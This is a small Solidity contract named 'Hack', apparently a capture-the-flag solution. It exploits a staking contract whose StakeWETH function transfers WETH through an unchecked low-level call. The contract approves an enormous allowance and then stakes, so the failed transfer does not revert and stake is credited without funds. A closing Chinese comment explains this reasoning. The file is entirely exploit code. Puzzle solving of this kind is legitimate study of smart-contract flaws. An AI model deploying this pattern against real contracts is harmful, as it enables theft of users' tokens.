// SPDX-License-Identifier: MIT
pragma solidity >0.6.4;
contract Hack{
    address public target;
    // bytes4 public test;
    bool public  success=false;
    constructor(address add) {
        target=add;
    }
    function solve(address weth_add)public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", target, 100000000000000000000000000000);
        // test =bytes4(keccak256("bytesToUint(bytes)"));

        (success, ) = weth_add.call(data);
        data= abi.encodeWithSignature("StakeWETH(uint256)", 100000000000000000000000000000);
        (success, ) = target.call(data);
    }
}
/*
通过计算keccak256得知调用的WETH属于ERC20合约，stackWETH用的call，因此transfer失败不会revert
 */